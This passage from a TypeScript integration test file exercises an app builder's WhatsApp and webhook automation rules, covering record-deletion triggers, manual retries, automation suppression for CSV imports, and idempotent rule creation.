      assert.equal(ruleRes.status, 201);

      // A record imported via CSV import sets this header -- the automation
      // must never fire for it.
      const importedRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
        method: "POST",
        headers: { ...authHeaders(token), "x-suppress-automations": "true" },
        body: JSON.stringify({ name: "Imported Customer", email: "imported@example.com", status: "New", phone: "972500000001" }),
      });
      assert.equal(importedRes.status, 201);

      // Give the (intentionally not-awaited) automation a chance to run if
      // it incorrectly fired, before asserting that it didn't.
      await new Promise((resolve) => setTimeout(resolve, 20));
      assert.equal(createdSockets[0].sendCalls.length, 0, "an imported record must never trigger a record_created automation");

      // An ordinary "Add" form submission (no header) on the SAME entity and
      // rule must still fire normally -- this isn't a blanket disable.
      const ordinaryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "New Customer", email: "new@example.com", status: "New", phone: "972500000002" }),
      });
      assert.equal(ordinaryRes.status, 201);

      for (let i = 0; i < 40 && createdSockets[0].sendCalls.length === 0; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.deepEqual(createdSockets[0].sendCalls, [
        { jid: "972500000002@s.whatsapp.net", text: "Welcome!", content: { text: "Welcome!" } },
      ]);
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 969: the new "record_deleted" automation trigger -- DELETE
 * /projects/:id/entities/:entityName/:recordId never called
 * runAutomationsForRecordChange at all before this round, so there was no
 * way to notify anyone (via WhatsApp or webhook) when a record was
 * removed. Confirms the route now fires a record_deleted rule using the
 * record's own last-known data (the "before" snapshot the route already
 * fetches for file cleanup) -- both to interpolate the message template
 * and to resolve a toMode:"field" destination, even though the row itself
 * is already gone from the database by the time this runs.
 */
test("DELETE .../entities/:entityName/:recordId fires a record_deleted automation, interpolating and resolving the destination from the record's own data right before it was removed", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, db) => {
      const email = `record-deleted-automation-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const owner = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [
          {
            name: "Customer",
            fields: [
              { name: "name", type: "text", required: true },
              { name: "phone", type: "text", required: true },
            ],
          },
        ],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Customers", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      await fetch(`${baseUrl}/api/projects/${projectId}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const ruleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          trigger: "record_deleted",
          actionType: "send_whatsapp",
          toMode: "field",
          toField: "phone",
          messageTemplate: "Goodbye {{name}}, your record was removed.",
        }),
      });
      assert.equal(ruleRes.status, 201, "record_deleted must be accepted as a real trigger value");

      const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Dana Levi", phone: "972501234567" }),
      });
      assert.equal(createRes.status, 201);
      const { record } = (await createRes.json()) as { record: { id: number } };

      // record_created automations (there are none configured here) must
      // not have fired anything yet -- this confirms the send below is
      // genuinely from the deletion, not a leftover from creation.
      assert.equal(createdSockets[0].sendCalls.length, 0);

      const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      assert.equal(deleteRes.status, 204);

      for (let i = 0; i < 40 && createdSockets[0].sendCalls.length === 0; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.deepEqual(createdSockets[0].sendCalls, [
        {
          jid: "972501234567@s.whatsapp.net",
          text: "Goodbye Dana Levi, your record was removed.",
          content: { text: "Goodbye Dana Levi, your record was removed." },
        },
      ]);

      // The record is genuinely gone -- the automation fired off the
      // "before" snapshot, not a live re-read.
      const listRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, { headers: authHeaders(token) });
      const { records } = (await listRes.json()) as { records: unknown[] };
      assert.equal(records.length, 0);
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 1015: the DELETE route fires a "record_deleted" automation and
 * cleans up that same record's own uploaded files off the identical
 * `before` snapshot. Before this round, both were two independent
 * fire-and-forget calls -- deleteUploadedFile's own `await rm` racing
 * findTemplateFileAttachment's real file read (reached here through
 * whatsappWeb.ts's sendMessage, which does its own `await readFile` before
 * calling the socket) against the exact same path, with nothing
 * sequencing them. Confirms the fix: `whatsapp.sendMessage`'s own promise
 * is held open here (the same opts.sendMessage gate round 536 already
 * established), and while it's still pending, the uploaded file must
 * still exist on disk -- proving the file cleanup hasn't even started,
 * not just that it happened to lose a race this one time -- and the real
 * attachment content (not a degraded plain-text send) must already be in
 * the queued WhatsApp content. Only once the gate is released does the
 * file actually get cleaned up.
 */
test("DELETE .../entities/:entityName/:recordId no longer races a record_deleted automation's own file read against this same delete's upload cleanup", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  let resolveSendGate: () => void = () => {};
  const sendGate = new Promise<void>((resolve) => {
    resolveSendGate = resolve;
  });
  await withServer(
    async (baseUrl, db, uploadsDir) => {
      const email = `delete-cleanup-race-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const owner = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [
          {
            name: "Customer",
            fields: [
              { name: "name", type: "text", required: true },
              { name: "receipt", type: "file", required: false },
            ],
          },
        ],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Customers", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      insertAutomationRule(db, {
        projectId,
        entityName: "Customer",
        trigger: "record_deleted",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "972501234567",
        messageTemplate: "Goodbye {{name}}, here is your final receipt: {{receipt}}",
      });

      await fetch(`${baseUrl}/api/projects/${projectId}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const formData = new FormData();
      formData.append("file", new File(["%PDF-fake-receipt-bytes"], "receipt.pdf", { type: "application/pdf" }));
      const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/fields/receipt/upload`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}` },
        body: formData,
      });
      assert.equal(uploadRes.status, 200);
      const upload = (await uploadRes.json()) as { file: { url: string; name: string; mimeType: string } };
      const storedFilename = upload.file.url.slice(upload.file.url.lastIndexOf("/") + 1);
      const onDiskPath = path.join(uploadsDir, projectId, "Customer", storedFilename);
      assert.ok(existsSync(onDiskPath), "the uploaded receipt must be a real file on disk before anything else runs");

      const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Dana Levi", receipt: JSON.stringify(upload.file) }),
      });
      assert.equal(createRes.status, 201);
      const { record } = (await createRes.json()) as { record: { id: number } };

      const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      assert.equal(deleteRes.status, 204);

      // Give the automation every chance to reach (and park inside) the
      // gated sendMessage call -- it must get there (and read the real
      // file into `content`) before this delete's own cleanup is even
      // allowed to start.
      for (let i = 0; i < 40 && createdSockets[0].sendCalls.length === 0; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.equal(createdSockets[0].sendCalls.length, 1, "the automation must have reached the gated send");
      const sentContent = createdSockets[0].sendCalls[0]!.content as { document?: Buffer; caption?: string };
      assert.ok(sentContent.document, "the real file must have already been read into the outgoing WhatsApp content");
      assert.equal(
        existsSync(onDiskPath),
        true,
        "the uploaded file must still exist on disk while the automation's own send is still in flight -- cleanup must not start before it",
      );

      resolveSendGate();
      for (let i = 0; i < 40 && existsSync(onDiskPath); i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.equal(existsSync(onDiskPath), false, "once the automation settles, the file cleanup must still actually run");
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db, { sendMessage: () => sendGate });
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 971: a record-triggered rule (record_created/field_equals/
 * record_deleted) gets exactly one delivery attempt -- unlike a
 * "schedule" rule, which retries automatically on every subsequent tick
 * until it succeeds (isScheduledRuleDue). Confirms the new manual Retry
 * route re-fires the rule against the record's CURRENT state, creating a
 * genuinely NEW run rather than mutating the original failed one, and
 * that retrying an already-succeeded run is rejected.
 *
 * Round 991 correction: this is true for record_created/field_equals,
 * exercised below, but was never actually reachable for record_deleted --
 * see the dedicated test just below this one, and
 * AutomationRun.recordSnapshot's own doc comment (packages/db/src/
 * automations.ts) for why.
 */
test("POST .../automations/:ruleId/runs/:runId/retry re-fires a failed record-triggered run against the record's current state, recording a new run without touching the original", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, db) => {
      const email = `retry-automation-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const owner = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [
          {
            name: "Customer",
            fields: [
              { name: "name", type: "text", required: true },
              { name: "phone", type: "text", required: true },
            ],
          },
        ],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Customers", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      const ruleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          trigger: "record_created",
          actionType: "send_whatsapp",
          toMode: "field",
          toField: "phone",
          messageTemplate: "Hi {{name}}, welcome!",
        }),
      });
      assert.equal(ruleRes.status, 201);
      const { rule } = (await ruleRes.json()) as { rule: { id: string } };

      // WhatsApp is deliberately never connected before this -- the
      // record_created automation still fires, but fails with "not
      // connected", exactly the kind of one-shot, no-recourse failure
      // this round's own Retry route exists to recover from.
      const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Dana Levi", phone: "972501234567" }),
      });
      assert.equal(createRes.status, 201);

      let runs: { id: string; status: string; error: string | null; recordId: number | null }[] = [];
      for (let i = 0; i < 40 && runs.length === 0; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
        const runsRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}/runs`, { headers: authHeaders(token) });
        ({ runs } = (await runsRes.json()) as { runs: typeof runs });
      }
      assert.equal(runs.length, 1);
      assert.equal(runs[0]!.status, "failed");
      assert.match(runs[0]!.error ?? "", /not connected/i);
      assert.ok(runs[0]!.recordId !== null, "a record_created run must carry the id of the record that triggered it");
      const failedRunId = runs[0]!.id;

      // Retrying before WhatsApp is connected must fail the same way the
      // original attempt did -- confirms the route genuinely re-fires
      // the real send logic, not a canned success.
      const tooEarlyRetryRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}/runs/${failedRunId}/retry`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(tooEarlyRetryRes.status, 200, "the retry route call itself succeeds even when the re-attempt it records fails");
      const { run: stillFailedRun } = (await tooEarlyRetryRes.json()) as { run: { status: string } | null };
      assert.equal(stillFailedRun?.status, "failed");

      await fetch(`${baseUrl}/api/projects/${projectId}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const retryRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}/runs/${failedRunId}/retry`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(retryRes.status, 200);
      const { run: newRun } = (await retryRes.json()) as { run: { id: string; status: string } | null };
      assert.equal(newRun?.status, "sent");
      assert.notEqual(newRun?.id, failedRunId, "a retry must record a genuinely NEW run, never overwrite the original failed one");

      assert.deepEqual(createdSockets[0].sendCalls, [
        { jid: "972501234567@s.whatsapp.net", text: "Hi Dana Levi, welcome!", content: { text: "Hi Dana Levi, welcome!" } },
      ]);

      const finalRunsRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}/runs`, { headers: authHeaders(token) });
      const { runs: finalRuns } = (await finalRunsRes.json()) as { runs: { id: string; status: string }[] };
      assert.equal(finalRuns.length, 3, "the original failed run, the too-early retry's own failed run, and the final successful retry must ALL be preserved as distinct history rows");
      assert.equal(finalRuns.filter((r) => r.status === "failed").length, 2);
      assert.equal(finalRuns.filter((r) => r.status === "sent").length, 1);

      // A run that already succeeded has nothing left to retry.
      const retrySentRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}/runs/${newRun!.id}/retry`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(retrySentRes.status, 400);
      assert.equal(((await retrySentRes.json()) as { code?: string }).code, "AUTOMATION_RUN_NOT_FAILED");
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 991: unlike record_created/field_equals (exercised by the retry
 * test just above), a "record_deleted" rule's own triggering event IS
 * that record's deletion -- getRecord(db, project.id, entity, run.recordId)
 * is GUARANTEED to find nothing for a run like this one, every single
 * time, not an occasional edge case. Before this round, the retry route
 * always 404'd with AUTOMATION_RUN_RECORD_GONE for a record_deleted run,
 * no matter when it was retried or what the record's own data was --
 * there was no sequence of actions that could make it succeed. Confirms
 * the new recordSnapshot column (captured at fire time, specifically for
 * this one trigger -- see AutomationRun.recordSnapshot's own doc comment,
 * packages/db/src/automations.ts) lets this retry actually succeed, using
 * the deleted record's own last-known field values.
 */
test("POST .../automations/:ruleId/runs/:runId/retry succeeds for a record_deleted-triggered run, replaying the deleted record's own last-known data instead of 404ing", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl, db) => {
      const email = `retry-record-deleted-${randomUUID()}@example.com`;
      const token = await signup(baseUrl, email);
      const owner = findUserByEmail(db, email)!;

      const spec: ProductSpec = {
        summary: "test",
        personas: [],
        roles: ["Admin"],
        entities: [
          {
            name: "Customer",
            fields: [
              { name: "name", type: "text", required: true },
              { name: "phone", type: "text", required: true },
            ],
          },
        ],
        screens: [],
        assumptions: [],
        openQuestions: [],
      };
      const projectId = randomUUID();
      insertProject(db, { id: projectId, ownerId: owner.id, name: "Customers", description: "test", spec });
      diffAndMigrate(db, projectId, undefined, spec);
      markProjectBuilt(db, projectId);

      const ruleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          trigger: "record_deleted",
          actionType: "send_whatsapp",
          toMode: "field",
          toField: "phone",
          messageTemplate: "Goodbye {{name}}, your record was removed.",
        }),
      });
      assert.equal(ruleRes.status, 201);
      const { rule } = (await ruleRes.json()) as { rule: { id: string } };

      const createRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Dana Levi", phone: "972501234567" }),
      });
      assert.equal(createRes.status, 201);
      const { record } = (await createRes.json()) as { record: { id: number } };

      // WhatsApp deliberately never connected before this -- the
      // record_deleted automation fires but fails with "not connected",
      // the exact one-shot failure this round's own fix exists to recover
      // from.
      const deleteRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer/${record.id}`, {
        method: "DELETE",
        headers: authHeaders(token),
      });
      assert.equal(deleteRes.status, 204);

      let runs: { id: string; status: string; error: string | null; recordId: number | null }[] = [];
      for (let i = 0; i < 40 && runs.length === 0; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
        const runsRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}/runs`, { headers: authHeaders(token) });
        ({ runs } = (await runsRes.json()) as { runs: typeof runs });
      }
      assert.equal(runs.length, 1);
      assert.equal(runs[0]!.status, "failed");
      assert.match(runs[0]!.error ?? "", /not connected/i);
      const failedRunId = runs[0]!.id;

      // The record is genuinely, permanently gone -- confirms this test
      // proves what it claims to (a real retry of a truly-deleted record),
      // not an accidental still-alive row.
      const listRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, { headers: authHeaders(token) });
      const { records } = (await listRes.json()) as { records: unknown[] };
      assert.equal(records.length, 0);

      await fetch(`${baseUrl}/api/projects/${projectId}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550001111:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      const retryRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${rule.id}/runs/${failedRunId}/retry`, {
        method: "POST",
        headers: authHeaders(token),
      });
      assert.equal(retryRes.status, 200, "retrying a record_deleted run must succeed now that its data was captured at fire time, not 404");
      const { run: newRun } = (await retryRes.json()) as { run: { id: string; status: string } | null };
      assert.equal(newRun?.status, "sent");
      assert.notEqual(newRun?.id, failedRunId);

      assert.deepEqual(
        createdSockets[0].sendCalls,
        [{ jid: "972501234567@s.whatsapp.net", text: "Goodbye Dana Levi, your record was removed.", content: { text: "Goodbye Dana Levi, your record was removed." } }],
        "the retry must resend using the deleted record's own last-known name/phone, not a blank/missing value",
      );
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 971: two cases genuinely have nothing to retry -- a "schedule"
 * rule's own run (never tied to one record; already retries
 * automatically on its own via isScheduledRuleDue) and a record-triggered
 * run whose record has since been deleted (its current state can no
 * longer be read at all). Both must be rejected with a clear error
 * rather than silently no-op'd or crashing.
 */
test("POST .../automations/:ruleId/runs/:runId/retry re-fires a schedule rule's own failed run too (round 972), but still rejects a legacy null-recordId run on a non-schedule rule, and one whose record no longer exists", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `retry-rejected-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const owner = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Reminder", fields: [{ name: "title", type: "text", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: owner.id, name: "Reminders", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    const scheduleRuleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "schedule",
        scheduleTimeUtc: "09:00",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "972500000000",
        messageTemplate: "Reminder!",
      }),
    });
    const { rule: scheduleRule } = (await scheduleRuleRes.json()) as { rule: { id: string } };

    // Simulated directly (no real scheduler tick in this test) -- a
    // schedule rule's own run never has a recordId at all.
    const db2 = db;
    recordAutomationRun(db2, projectId, scheduleRule.id, { status: "failed", error: "WhatsApp is not connected" }, "send_whatsapp");
    const { runs: scheduleRuns } = (await (await fetch(`${baseUrl}/api/projects/${projectId}/automations/${scheduleRule.id}/runs`, { headers: authHeaders(token) })).json()) as {
      runs: { id: string; recordId: number | null }[];
    };
    assert.equal(scheduleRuns[0]!.recordId, null);

    // Round 972: a schedule rule's own null-recordId run is now retried
    // too, not rejected -- WhatsApp is never connected in this test, so
    // the re-attempt itself still fails, but the route call must succeed
    // (200) and record a genuinely NEW run, proving it actually re-ran
    // fireScheduledRule rather than returning a canned 400.
    const scheduleRetryRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${scheduleRule.id}/runs/${scheduleRuns[0]!.id}/retry`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(scheduleRetryRes.status, 200, "a schedule rule's own failed run must now be retried, not rejected with 400");
    const { run: scheduleRetryRun } = (await scheduleRetryRes.json()) as { run: { id: string; status: string } | null };
    assert.equal(scheduleRetryRun?.status, "failed", "WhatsApp was never connected in this test, so the re-attempt itself still fails");
    assert.notEqual(scheduleRetryRun?.id, scheduleRuns[0]!.id, "the retry must record a genuinely new run");

    // A legacy run with no recordId on a NON-schedule rule has nothing to
    // retry at all -- only possible for a run recorded before this
    // column existed, with no record reference ever captured.
    const legacyRuleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "send_whatsapp",
        toMode: "static",
        toNumber: "972500000000",
        messageTemplate: "New reminder!",
      }),
    });
    const { rule: legacyRule } = (await legacyRuleRes.json()) as { rule: { id: string } };
    recordAutomationRun(db2, projectId, legacyRule.id, { status: "failed", error: "recipient not found" }, "send_whatsapp");
    const { runs: legacyRuns } = (await (await fetch(`${baseUrl}/api/projects/${projectId}/automations/${legacyRule.id}/runs`, { headers: authHeaders(token) })).json()) as {
      runs: { id: string; recordId: number | null }[];
    };
    const legacyRetryRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${legacyRule.id}/runs/${legacyRuns[0]!.id}/retry`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(legacyRetryRes.status, 400, "a record-triggered rule's own run with no recordId at all (predating this column) still has nothing to retry");
    assert.equal(((await legacyRetryRes.json()) as { code?: string }).code, "AUTOMATION_RUN_NOT_RETRYABLE");

    // A record-triggered rule whose record has since been deleted.
    const createdRuleRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/automations`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        trigger: "record_created",
        actionType: "webhook",
        webhookUrl: "https://example.invalid/hook",
        toMode: "static",
        messageTemplate: "New reminder!",
      }),
    });
    const { rule: createdRule } = (await createdRuleRes.json()) as { rule: { id: string } };
    const recordRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ title: "Buy milk" }),
    });
    const { record } = (await recordRes.json()) as { record: { id: number } };

    let createdRuns: { id: string; recordId: number | null }[] = [];
    for (let i = 0; i < 40 && createdRuns.length === 0; i++) {
      await new Promise((resolve) => setTimeout(resolve, 0));
      const runsRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${createdRule.id}/runs`, { headers: authHeaders(token) });
      ({ runs: createdRuns } = (await runsRes.json()) as { runs: typeof createdRuns });
    }
    assert.equal(createdRuns.length, 1);
    assert.equal(createdRuns[0]!.recordId, record.id);

    await fetch(`${baseUrl}/api/projects/${projectId}/entities/Reminder/${record.id}`, { method: "DELETE", headers: authHeaders(token) });

    const goneRecordRetryRes = await fetch(`${baseUrl}/api/projects/${projectId}/automations/${createdRule.id}/runs/${createdRuns[0]!.id}/retry`, {
      method: "POST",
      headers: authHeaders(token),
    });
    assert.equal(goneRecordRetryRes.status, 404);
    assert.equal(((await goneRecordRetryRes.json()) as { code?: string }).code, "AUTOMATION_RUN_RECORD_GONE");
  });
});

/**
 * Round 683: CSV import (EntityPanel.tsx's handleImportFile) now PATCHes a
 * row whose own leading "id" column matched an existing record, instead of
 * always POSTing a new one -- the exact same bulk-reimport-of-pre-existing-
 * data scenario the test above already protects on the create side. The
 * PATCH route didn't check X-Suppress-Automations at all before this round,
 * so a re-imported update would have fired "record_updated" for every row
 * at once. Mirrors the POST test above: the header must suppress the rule
 * on a PATCH, and an ordinary field edit (no header) must still fire it.
 */
test("PATCH .../entities/:entityName/:recordId with X-Suppress-Automations skips the record_updated automation, but an ordinary edit (no header) still fires it", async () => {
  let createdSockets: ReturnType<typeof createFakeWhatsAppSocket>[] = [];
  await withServer(
    async (baseUrl) => {
      const token = await signup(baseUrl, "suppress-automations2@example.com");
      const createRes = await fetch(`${baseUrl}/api/projects`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          description:
            "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
        }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };
      const buildRes = await fetch(`${baseUrl}/api/projects/${project.id}/build`, { method: "POST", headers: authHeaders(token) });
      await collectSSE(buildRes);

      await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/connect`, { method: "POST", headers: authHeaders(token) });
      createdSockets[0].sock.user = { id: "15550009999:1@s.whatsapp.net" };
      createdSockets[0].emitConnectionUpdate({ connection: "open" });

      // "field_equals" is this app's actual update-triggered rule (there is
      // no separate "record_updated" trigger value -- see automations.ts's
      // matchesTrigger): it fires on a PATCH the moment the given field is
      // set to the given value, as part of that same request's own payload.
      // Uses the free-text "name" field (not "status", an enum whose
      // declared values this spec controls, not this test) so the target
      // value "VIP Customer" is guaranteed to be one the field can actually
      // hold, same as every other field_equals test in this file does for
      // a text field.
      const ruleRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/automations`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({
          trigger: "field_equals",
          fieldName: "name",
          fieldValue: "VIP Customer",
          actionType: "send_whatsapp",
          toMode: "field",
          toField: "phone",
          messageTemplate: "Updated!",
        }),
      });
      assert.equal(ruleRes.status, 201);

      const customerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Dana", email: "dana@example.com", status: "New", phone: "972500000003" }),
      });
      const { record: customer } = (await customerRes.json()) as { record: { id: number } };

      // A row re-imported via CSV import (its own leading "id" column
      // matched this existing record) sets this header -- the
      // field_equals-on-update automation must never fire for it.
      const importedRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/${customer.id}`, {
        method: "PATCH",
        headers: { ...authHeaders(token), "x-suppress-automations": "true" },
        body: JSON.stringify({ name: "VIP Customer" }),
      });
      assert.equal(importedRes.status, 200);

      await new Promise((resolve) => setTimeout(resolve, 20));
      assert.equal(createdSockets[0].sendCalls.length, 0, "an imported update must never trigger a field_equals automation");

      // An ordinary inline-edit/form PATCH (no header) on a SECOND record
      // and the same rule must still fire normally -- this isn't a blanket
      // disable. A second record (not the one just suppressed above) keeps
      // this independent of matchesTrigger's own "only once, on the exact
      // request that changed the field" rule.
      const secondRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "Noa", email: "noa@example.com", status: "New", phone: "972500000004" }),
      });
      const { record: second } = (await secondRes.json()) as { record: { id: number } };
      const ordinaryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Customer/${second.id}`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ name: "VIP Customer" }),
      });
      assert.equal(ordinaryRes.status, 200);

      for (let i = 0; i < 40 && createdSockets[0].sendCalls.length === 0; i++) {
        await new Promise((resolve) => setTimeout(resolve, 0));
      }
      assert.deepEqual(createdSockets[0].sendCalls, [
        { jid: "972500000004@s.whatsapp.net", text: "Updated!", content: { text: "Updated!" } },
      ]);
    },
    {
      whatsapp: (db) => {
        const { manager, createdSockets: sockets } = createTestWhatsAppManager(db);
        createdSockets = sockets;
        return manager;
      },
    },
  );
});

/**
 * Round 600's Explore survey found that docs/wakeRetry-idempotency-design.md's
 * own inventory of mutating routes never mentioned
 * POST /projects/:id/entities/:entityName/automations at all -- Automation
 * Rules was added out-of-band well after that inventory was written, and
 * unlike every other real-effect insert route in this file (rounds 471-528,
 * 594), this one called insertAutomationRule() with no withIdempotency()
 * guard. A response lost in transit after the rule was already inserted
 * would make fetchWithWakeRetry (apps/web/src/wakeRetry.ts) resend the
 * identical POST, and createAutomationRule (apps/web/src/api.ts) sent no
 * X-Idempotency-Key header at all -- unlike all 8 of its sibling creation
 * functions -- so even a server-side guard alone wouldn't have helped the
 * real client. Fixed both: the client now sends a real header, and the
 * route wraps insertAutomationRule() in withIdempotency(), same as the
 * sibling /entities/:entityName (record creation) route round 594 fixed.
 */
test("POST /projects/:id/entities/:entityName/automations retried with the same idempotency key after the first attempt already finished replays the original response instead of inserting a second rule", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "automation-create-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description:
